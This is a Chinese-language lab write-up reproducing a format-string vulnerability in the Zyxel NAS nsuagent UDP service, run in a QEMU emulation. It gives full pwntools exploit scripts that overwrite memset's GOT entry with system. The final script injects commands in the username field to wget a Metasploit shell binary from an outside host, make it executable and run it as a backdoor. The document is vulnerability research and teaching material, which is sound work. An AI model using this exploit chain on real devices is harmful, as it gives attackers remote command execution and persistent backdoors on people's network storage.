# Zyxel-NAS漏洞复现（Hijack GOT）
> 0431物联卫士实验室
> 来源：https://www.iotsec-zone.com/article/327

# 0、前言
本篇文章我们会基于前面模拟的环境来复现该漏洞。所需要的前置知识：
1. [PWN入门（2-1-6）-格式化字符串漏洞-hijack GOT](https://www.yuque.com/cyberangel/rg9gdm/xezt9x)
2. [PWN进阶（1-8）-ret2dlresolve(1)（高级ROP）](https://www.yuque.com/cyberangel/rg9gdm/oyne1i)

# 1、启动模拟环境
当你关闭qemu后若想要重新启动模拟环境就需要依次执行下面的所有命令：
```bash
# Ubuntu虚拟机--------------------------------------------------------------------------------
$ sudo tunctl -t tap0
$ sudo ifconfig tap0 192.168.5.2/24
$ sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \
  -initrd initrd.img-3.2.0-4-vexpress \
  -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \
  -append "root=/dev/mmcblk0p2" -smp 2,cores=2 \
  -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic
# qemu----------------------------------------------------------------------------------------
$ ifconfig eth0 down									# 重启qemu之后网卡名称会重新变回eth0
$ ip link set eth0 name egiga0
$ ifconfig egiga0 up
$ ifconfig egiga0 192.168.5.1/24
$ mount -o bind /dev ./rootfs/dev && mount -t proc /proc ./rootfs/proc
$ mount -vt sysfs sysfs ./rootfs/sys
$ chroot ./rootfs sh
$ nsuagent
# 新建终端--------------------------------------------------------------------------------------
$ scp ./gdbserver-armel-static-8.0.1 root@192.168.5.1:/root/rootfs/
$ ssh root@192.168.5.1
$ chroot ./rootfs sh
$ chmod +x ./gdbserver-armel-static-8.0.1 
```
![0.png](https://www.iotsec-zone.com/images/MdImg/6d3179c84109e86b824fbc994e78c430.png)
![1.png](https://www.iotsec-zone.com/images/MdImg/fcfe65e46ab48e9711d1c92450cc5a0c.png)

# 2、开始pwn
## ①、收集信息
由于Crossover在运行Windows软件时开销过大，所以本篇文章中我们大多数时候使用pwndbg取代IDA的动态调试功能、使用python的pwntools库实现UDP流量包的重放。
> 注：wireshark软件本身不支持重放。

使用wireshark打开上一节中抓取的流量包，查看发送含有我们账号密码的认证数据包：
![2.png](https://www.iotsec-zone.com/images/MdImg/c37a9f2335f963a9b6dd622b859c8a6f.png)
将上面的所有的16进制复制下来，使用pwntools进行重放UDP，所以我们有如下代码：
```python
from pwn import *
from threading import Thread

context.log_level="debug"
def accept():
    l=listen(50127, typ='udp')	# 监听本地（Ubuntu）的50127端口
    l.wait_for_connection()
    print(l.recv(100))			# 接收100字节应该够了
    l.close()

thread = Thread(target=accept)
thread.start()

p=remote('192.168.5.1', 50127, typ='udp')
data=bytes.fromhex(
    "00420241001c42af5b3a004f525400123456555345524e414d453a6379626572616e67656c0950415353574f52443a6379626572616e67656c0953484152455f5245513a30094654505f5245513a30")
p.send(data)
p.close()
```
![3.png](https://www.iotsec-zone.com/images/MdImg/c9b016d3e75201108eefda09a5159e2e.png)
嗯，看起来挺成功。现在就按照常见的pwn流程来吧，首先检查可执行文件的保护：
![4.png](https://www.iotsec-zone.com/images/MdImg/50c4cba01511c5daddac2cdb3527e5ea.png)
- No RELRO：GOT、PLT完全没有任何保护【详情可参照本文章开头的链接】。
- No canary found：没有canary保护。
- NX enabled：栈不可执行。
- No PIE：虽然程序没有开启PIE保护，但这并不意味着加载的动态链接库和其栈地址一定不变，因为我们并不知道实机上ASLR的保护等级（如下图所示），这里需要按照可变地址来考虑...
- 
![5.png](https://www.iotsec-zone.com/images/MdImg/ba8ef02d12fdeefbf99c6363b91c765c.png)
> 上图来自：[https://www.yuque.com/hideandseek1231/fcr95d/qubx1x](https://www.yuque.com/hideandseek1231/fcr95d/qubx1x)

## ②、寻找调用链
对存在漏洞的sub_14C60函数交叉引用发现有许多函数调用了它：
![6.png](https://www.iotsec-zone.com/images/MdImg/45c5d96e20c7bb0185c8cacb60a93b30.png)
我们并不清楚调用链，但是可以通过gdb获取：
![7.png](https://www.iotsec-zone.com/images/MdImg/d8f475ca38f9bf8498044a44797b8145.png)
gdb-client连接上后会自动断在recvfrom函数：
![8.png](https://www.iotsec-zone.com/images/MdImg/b305047590f7b0d99bd0ff47a27f4179.png)
对地址0x14C60下断点，run后再次执行我们的exp1.py：
![9.png](https://www.iotsec-zone.com/images/MdImg/9103b4b9c1e98a550d63a75b15219f3c.png)
不知道是不是由于gdbserver的原因，很不幸的是我们无法通过bt或frame知道函数的调用过程，提示错误corrupt stack；但仍旧可以通过寄存器R14（LR）知道调用该函数的父函数：
![10.png](https://www.iotsec-zone.com/images/MdImg/dd0a394d5b916c3afffdffde3ead555a.png)
![11.png](https://www.iotsec-zone.com/images/MdImg/bf40b1e4b0747ba070b09aee6f551a41.png)
![12.png](https://www.iotsec-zone.com/images/MdImg/d0e211ade1bd213863774ce3320e37e3.png)
因此调用链为：main_function(sub_123EC) -> sub_1AEE4 -> sub_14C60(vuln_fucntion)。大致的看一下发现sub_1AEE4有多达5处调用了sub_14C60：
```C
void __fastcall __noreturn sub_1AEE4(int a1)
{
  // ...
  v31 = &unk_34D48;
  sub_159F8(a1, 0);
  sub_14C60(a1, "[%s][%d] Start with m_bIsWirelessEnabled = %d\n", "Run", 1320, *(unsigned __int8 *)(a1 + 32));
  sub_15474(a1);
  std::operator+<char>((int)v32, "|dstart|NDU Agent started: ");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            addr_len = 16;
            recvfrom(*(_DWORD *)(a1 + 300), buf, 0x10D8u, 0, &addr, &addr_len);
            v2 = sub_1BC48(buf, v40);
            v3 = inet_ntoa(*(struct in_addr *)&addr.sa_data[2]);
            sub_14C60(a1, "[%s][%d] GOT YOU!!!!!!, pcode = %d, ip address: %s\n", "Run", 1342, v2, v3);// sub_1AEE4 -> sub_14C60
            // ...
          }
          v4 = v2 == 2;
          if ( v2 != 2 )
            v4 = v2 == 4;
          if ( !v4 )
            break;
          if ( dword_34E9C )
          {
            v5 = std::operator<<<std::char_traits<char>>(&std::cout, "response packet. escape");
            std::endl<char,std::char_traits<char>>(v5);
          }
        }
            // ...
        }
          // ...
      }
        // ...
    }
    // ...
    sub_14C60(
      a1,
      "AuthMac: %X:%X:%X:%X:%X:%X\n",
      (unsigned __int8)v41,
      BYTE1(v41),
      BYTE2(v41),
      HIBYTE(v41),
      (unsigned __int8)v42,
      HIBYTE(v42));
    sub_14C60(a1, "LocalMac1: %X:%X:%X:%X:%X:%X\n", v16, v17, v18, v19, v20, v21);
    if ( sub_157CC(a1, &v41) )
      break;
LABEL_51:
    std::string::~string((std::string *)&v33);
    sub_1F224(v46);
  }
  sub_1F4C4(&v34, v46);
  sub_1F4DC(&v35, v46);
  sub_14C60(a1, "username: %s, password: %s\n", v34, v35);
  // ...
}
```
根据上面的代码框，我们知道程序在启动完毕之后会阻塞在recvfrom函数直到用户向程序发送了数据，在接收到输入之后会根据相应的判断语句进行处理。根据程序的行为知道处理完成之后它并不会退出，而是阻塞在recvfrom继续等待接收下一次用户的输入。sub_14C60在解析用户可控的username与password前的debug数据如下，这两者均存在于堆上：
![13.png](https://www.iotsec-zone.com/images/MdImg/02c7244191c3f8290269d6dd7002e896.png)
## ③、思路整理
将上面的exp稍微的进行修改以方便更换我们的payload：
```python
from pwn import *
from threading import Thread

context.log_level="debug"
def accept():
    l=listen(50127, typ='udp')	# 监听本地（Ubuntu）的50127端口
    l.wait_for_connection()
    print(l.recv(100))			# 接收100字节应该够了
    l.close()

thread = Thread(target=accept)
thread.start()

p=remote('192.168.5.1', 50127, typ='udp')
payload_username = b"cyberangel"
payload_password = b"bbbb"+b".%p"*50			# payload
encode_username = payload_username.hex()
encode_password = payload_password.hex()
data=bytes.fromhex(
    f"00420241001c42af5b3a004f525400123456555345524e414d453a{encode_username}0950415353574f52443a{encode_password}0953484152455f5245513a30094654505f5245513a30")
p.send(data)
p.close()
```
回过头来仔细研究sub_14C60，发现它会将执行日志输出到文件/tmp/nsu_process中，并且该日志永远不会删除：
![14.png](https://www.iotsec-zone.com/images/MdImg/4315d4421cb63c1cb8bfc00d22a3806a.png)
执行一次exp2.py后可以有如下日志，
![15.png](https://www.iotsec-zone.com/images/MdImg/8cc5711d1b555d9af4a768c5eb269c11.png)
但是程序对输入的payload（password）有32字节长度限制，导致泄露的地址并不完整...
![16.png](https://www.iotsec-zone.com/images/MdImg/83a8ca84aaeb9210a87c2212c7683985.png)
仔细想想，就算泄露出来的地址是完整的又怎样？因为我们并不能在程序回显时拿到任何有效信息：
![17.png](https://www.iotsec-zone.com/images/MdImg/60fbf408f9f94dac59878aa82cfae66e.png)
这就意味着所有leak地址的思路都已经被堵死，并且程序还开启了NX保护，无法在stack上构造自己的ROP链；那就只能利用程序里面现有的已知数据构造利用链了。从程序保护方面来讲，nsuagent最大的弱点在没有开启RELRO保护，所以获取我们可以从这里下手：
![18.png](https://www.iotsec-zone.com/images/MdImg/47c47e4d65caabe1624d1d7a84f136e8.png)
利用方式有两种：
1. 是利用ret2dlresolve去修改处于可写状态的.dynamic节的DT_STRTAB的d_ptr指针，这就要求我们需要在栈上伪造一个ELF String Table（.dynstr section），并篡改相应的结构指针，这样在动态链接的时候就会将该符号解析为system函数。
2. 因为.got.plt（俗称got表）可写，那我们就直接篡改got表为某个函数的地址并正常调用被篡改的函数即可。

emmm，相比较而言还是第二种方法比较简单，那就用它吧。具体实施之前我们还是来看一个简单的例子：
```C
#include<stdio.h>
void backdoor(char* str){
	system(str);
}
int main(){
	puts("/bin/sh");
	return 0;
}
/*
[*] '/home/cyberangel/Desktop/test1'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
*/
```
启动gdb断到main函数，将puts的got表手动改为system的plt：set *0x600958=0x400410
![19.png](https://www.iotsec-zone.com/images/MdImg/3d28108a06e40ca3eb1cd6a4458c9efc.png)
![20.png](https://www.iotsec-zone.com/images/MdImg/56523617d3743b7d3a4a20531a3c0849.png)
continue后会执行system("/bin/sh")：
![21.png](https://www.iotsec-zone.com/images/MdImg/7637979e77bfb88f4b138a03264c485e.png)
这样做似乎无法维持一个稳定的shell，执行一条命令就退出了，不知道是不是我的问题；当然了，就算存在这个问题但对于nsuagent并不影响，因为只要程序不崩溃就会一直可以接收用户的输入，从而实现多次命令执行的效果。还要说明一点的是注意arm与x86在.got.plt的区别，nsuagen的.got就是x86的.got.plt：
![22.png](https://www.iotsec-zone.com/images/MdImg/b5bb252fd4994b109b1f5aed44bc81d8.png)
![23.png](https://www.iotsec-zone.com/images/MdImg/68b4191dd91f3df1caedf9bbf7728434.png)
不知道是不是因为libc版本过低的问题：
![24.png](https://www.iotsec-zone.com/images/MdImg/6959e64addeb300b6a528d064a0a58a2.png)

## ④、构造利用链
好了，到现在我们整理一下思路，因为got表是可写的，所以我们可以劫持某个函数的got表为system以达到命令执行的效果（Linux延迟绑定技术）。那我们究竟篡改哪一个函数呢？注意到漏洞点有一个memset：
![25.png](https://www.iotsec-zone.com/images/MdImg/30fba6a84a408675d167028441a4c628.png)
根据栈帧平衡原理再结合sub_1AEE4的汇编代码我们可以知道每次调用sub_14C60时memset初始化s变量的栈空间完全相同（空间的起始地址与结束地址相同），可以下个断点来看看（b *0x14C7C）：
![26.png](https://www.iotsec-zone.com/images/MdImg/91cafebdeadbdfd9c5f563e5c03a4fe7.png)
![27.png](https://www.iotsec-zone.com/images/MdImg/1b87d2fdab429b6ec1b92386b01ea846.png)
![28.png](https://www.iotsec-zone.com/images/MdImg/1df3930bbbb272893979bb148ed06ec9.png)
![29.png](https://www.iotsec-zone.com/images/MdImg/9ae942ad1c6766819ea6b59338004781.png)

虽然将memset篡改为system会导致无法清空栈空间，但是好在每一次调用函数时影响的都是同一片内存区域，并不影响程序的正常运行；而且还有一个好处就是我们可以多次的主动调用memset函数。
> system调用失败后并不会让程序崩溃

首先测量格式化字符串的偏移，在gdb调试时断点下在sub_14C60调用fprintf之前（b *0x14CE0）：
![30.png](https://www.iotsec-zone.com/images/MdImg/f8e2c7f82bf1704d20e938a0b753aac4.png)
再次调试并发送前面的exp2.py：
![31.png](https://www.iotsec-zone.com/images/MdImg/b78c42ed89914e18984747ff51281a00.png)
如上图所示，R1存放着被截断之后的格式化字符串，但是我们可以仍旧在栈上找到残留的完整字符串：
![32.png](https://www.iotsec-zone.com/images/MdImg/a1947b3ab7114dd4d7322035a1ef5f22.png)
我们截取该段字符串从USERNAME开始使用，其起始地址为0x7e8d49b2：
![33.png](https://www.iotsec-zone.com/images/MdImg/82dbb7cd49a11978c12ff9208c55fe19.png)
接下来强制将R1寄存器改为该地址：set $r1=0x7e8d49b2，运行后可以得到如下结果：

![34.png](https://www.iotsec-zone.com/images/MdImg/d9ebf713fe793f60c4f7d9bdc5dfa890.png)
整理可以得到偏移为39：
![35.png](https://www.iotsec-zone.com/images/MdImg/05cb76b1a8b688b009b95dbbcae25784.png)
![36.png](https://www.iotsec-zone.com/images/MdImg/5d65813372c2f24c99335ca75fdea5bf.png)
然后开始使用格式化字符串$n更改memset的got表，首先是：payload_password = b"bbbb"+b"%73904c%39$n"
![37.png](https://www.iotsec-zone.com/images/MdImg/1c981c3d0c2abe371b3c80aab024dcfe.png)
发现程序会崩溃：
![38.png](https://www.iotsec-zone.com/images/MdImg/ab246a7b55c3216bda3435de19be9287.png)
这也很正常，payload中%73904c%39$n本身的含义就是“打印73904个字节，然后将打印的字节数目作为值写入距离格式化字符串偏移为39的栈上指针指向的区域。从上图来看向非法地址bbbb写入的不是system的plt而是_cxa_pure_virtual：

![39.png](https://www.iotsec-zone.com/images/MdImg/82cf1df6c9aea3636d16353f8561d072.png)
> 0x120D4 - 0x120b0 == 0x24（36）
> 73904 - 36 == 73868

稍微修改一下payload：payload_password = p32(memset_got)+b"%73868c%39$n"【memset_got = 0x34BE4】，要将地址减去36的原因在于进入漏洞函数时会进行如下拼接：
![40.png](https://www.iotsec-zone.com/images/MdImg/ff5c4be5c5c9cf5809d5a03858bbddac.png)

也就是在执行fprintf时其参数格式化字符串为：username: cyberangel, password: addr%73868c%39$n，从该字符串开头到格式化字符串的位置一共36字节，fprintf会直接将这36字节的字符直接输出，再结合上面的内容故需要减36：
![41.png](https://www.iotsec-zone.com/images/MdImg/1ea7b3421f1689e7756050ae1c63ba81.png)
执行后发现我们输入的payload会发生"\x00"截断：
![42.png](https://www.iotsec-zone.com/images/MdImg/0dfec1922dc2fb48bfc7b4445ce19d2a.png)
我们后面输入的格式化字符串没有了！gdb后得知程序在解析密码时发生了截断，如下图所示，其中v46保存了我们所有发送数据的buffer：
![43.png](https://www.iotsec-zone.com/images/MdImg/cdc0335475d88c360de4b842ee5325ad.png)
![44.png](https://www.iotsec-zone.com/images/MdImg/4d7706d9a65156add78e383721b61b74.png)
经过sub_1F4DC的std::string::string后：
```C
void __fastcall sub_1F4DC(std::string *a1, int a2)
{
  std::string::string(a1, (const std::string *)(a2 + 24));
}

```
![45.png](https://www.iotsec-zone.com/images/MdImg/6525767dfdcfefd3c18d7d5e6e7ddbca.png)
![46.png](https://www.iotsec-zone.com/images/MdImg/9a6fd0e3ea39b99cf8828a3c0adec41b.png)
真好，被截的什么都不剩...稍微调整一下p32(memset_got)的位置，有：payload_password = b'bbbb'+b"%73868c%43$n"+p32(memset_got)
![47.png](https://www.iotsec-zone.com/images/MdImg/321e60bac627e87e21118c8a0df0c7d9.png)
嘿嘿，这下应该没问题了吧？
![48.png](https://www.iotsec-zone.com/images/MdImg/dbb3289032da11a2bd3534fc9c2e0be8.png)
？？？，哪儿来的0x0a（'\n'）？我找了半天才发现是格式化是自带的...
![49.png](https://www.iotsec-zone.com/images/MdImg/94337377aecc461f8ebdca75664c40a6.png)
绝，那就不能使用经过vsnprintf拼接后的字符串了。但是我们注意到，recvfrom接收用户输入之后会将数据保留到栈上，它是未经修改，原汁原味的数据，如下图所示（b *0x14CE0）：
![50.png](https://www.iotsec-zone.com/images/MdImg/8581369dd8a21e19c7acf28c2d33770b.png)
重复上面寻找偏移的步骤，有如下exp3.py：
```python
from pwn import *
from threading import Thread
context.log_level="debug"
context.arch="arm"
context.endian="little"
def accept():
    l=listen(50127, typ='udp')	# 监听本地（Ubuntu）的50127端口
    l.wait_for_connection()
    print(l.recv(100))			# 接收100字节应该够了
    l.close()

thread = Thread(target=accept)
thread.start()  

memset_got=0x34BE4
p=remote('192.168.5.1', 50127, typ='udp')
payload_username = b"cyberangel"
payload_password = b'bbbb'+b"%73868c%347$n"+p32(memset_got)		# b'bbbb'+b"%73868c%43$n"+p32(memset_got)
encode_username = payload_username.hex()
encode_password = payload_password.hex()
data=bytes.fromhex(
    f"00420241001c42af5b3a004f525400123456555345524e414d453a{encode_username}0950415353574f52443a{encode_password}0953484152455f5245513a30094654505f5245513a30")
p.send(data)
p.close()
```
![51.png](https://www.iotsec-zone.com/images/MdImg/ade6828b3019dc51c0a53fdcd03f125e.png)
![52.png](https://www.iotsec-zone.com/images/MdImg/10896960adeafae91150b8c9c6ea99d1.png)
可以看到成功命令执行。现在memset已经被成功改为了system了，最后完善一下就可以了。因为该NAS有wget，所以我们先修复一下软链接：
```bash
/ # rm ./usr/sbin/wget 
/ # ln -s /bin/busybox /usr/sbin/wget
/ # wget
BusyBox v1.19.4 (2021-04-01 09:56:40 CST) multi-call binary.

Usage: wget [-c|--continue] [-s|--spider] [-q|--quiet] [-O|--output-document FILE]
	[--header 'header: value'] [-Y|--proxy on/off] [-P DIR]
	[--no-check-certificate] [-U|--user-agent AGENT] [-T SEC] URL...

/ # 
```
使用kali生成msf反向shell，注意这里的LHOST为虚拟机的IP而不是qemu的IP：
![53.png](https://www.iotsec-zone.com/images/MdImg/99268f374d222c90241c1d971d5937f9.png)
使用python在msf目录下启动http服务：
![54.png](https://www.iotsec-zone.com/images/MdImg/f05f4078c1e19d564897218009089b29.png)
完整exp如下：
```python
from pwn import *
from threading import Thread
context.log_level="debug"
context.arch="arm"
context.endian="little"
def accept():
    l=listen(50127, typ='udp')	# 监听本地（Ubuntu）的50127端口
    l.wait_for_connection()
    print(l.recv(100))			# 接收100字节应该够了
    l.close()

thread = Thread(target=accept)
thread.start()  

memset_got=0x34BE4
p=remote('192.168.5.1', 50127, typ='udp')
payload1_username = b"cyberangel"
payload1_password = b'bbbb'+b"%73868c%347$n"+p32(memset_got)
encode1_username = payload1_username.hex()
encode1_password = payload1_password.hex()
data1=bytes.fromhex(
    f"00420241001c42af5b3a004f525400123456555345524e414d453a{encode1_username}0950415353574f52443a{encode1_password}0953484152455f5245513a30094654505f5245513a30")
p.send(data1)

payload2_username = b";wget http://192.168.5.2:8080/msf-arm -O /backdoor;"	# 下载backdoor
payload2_password = b"cyberangel"
encode2_username = payload2_username.hex()
encode2_password = payload2_password.hex()
data2=bytes.fromhex(
    f"00420241001c42af5b3a004f525400123456555345524e414d453a{encode2_username}0950415353574f52443a{encode2_password}0953484152455f5245513a30094654505f5245513a30")
p.send(data2)

payload3_username = b";chmod +x /backdoor;"		# 授予可执行权限
payload3_password = b"cyberangel"
encode3_username = payload3_username.hex()
encode3_password = payload3_password.hex()
data3=bytes.fromhex(
    f"00420241001c42af5b3a004f525400123456555345524e414d453a{encode3_username}0950415353574f52443a{encode3_password}0953484152455f5245513a30094654505f5245513a30")
p.send(data3)

payload4_username = b";/backdoor;"				# 执行backdoor
payload4_password = b"cyberangel"
encode4_username = payload4_username.hex()
encode4_password = payload4_password.hex()
data4=bytes.fromhex(
    f"00420241001c42af5b3a004f525400123456555345524e414d453a{encode4_username}0950415353574f52443a{encode4_password}0953484152455f5245513a30094654505f5245513a30")
p.send(data4)

p.close()
```
先在虚拟机上监听：
![55.png](https://www.iotsec-zone.com/images/MdImg/4ba1ffd03d77dfa337305a832010c4a6.png)
正向shell的生成步骤如下（默认向外映射端口为4444），exp稍微变动一下msf文件名称就行：
![56.png](https://www.iotsec-zone.com/images/MdImg/6427f90c3bc45ecffc724b06d2fd11dc.png)
```python
from pwn import *
from threading import Thread
context.log_level="debug"
context.arch="arm"
context.endian="little"
# （和exp4.py一样）...
payload2_username = b";wget http://192.168.5.2:8080/back -O /back;"
# 略...

p.close()
```
![57.png](https://www.iotsec-zone.com/images/MdImg/6380ecd7d4ec476c15524cc1be86f934.png)
> 注意：关于backdoor文件的命名注意简短，否则可能会出现wget文件之后落地文件的命名不正确，比如msf-arm-positive落地后文件名称变为了"b,"，payload为：payload2_username = b";wget [http://192.168.5.2:8080/msf-arm-positive](http://192.168.5.2:8080/msf-arm-positive) -O /back;"

![58.png](https://www.iotsec-zone.com/images/MdImg/1a4b12c668a2e8481318388700974ff6.png)
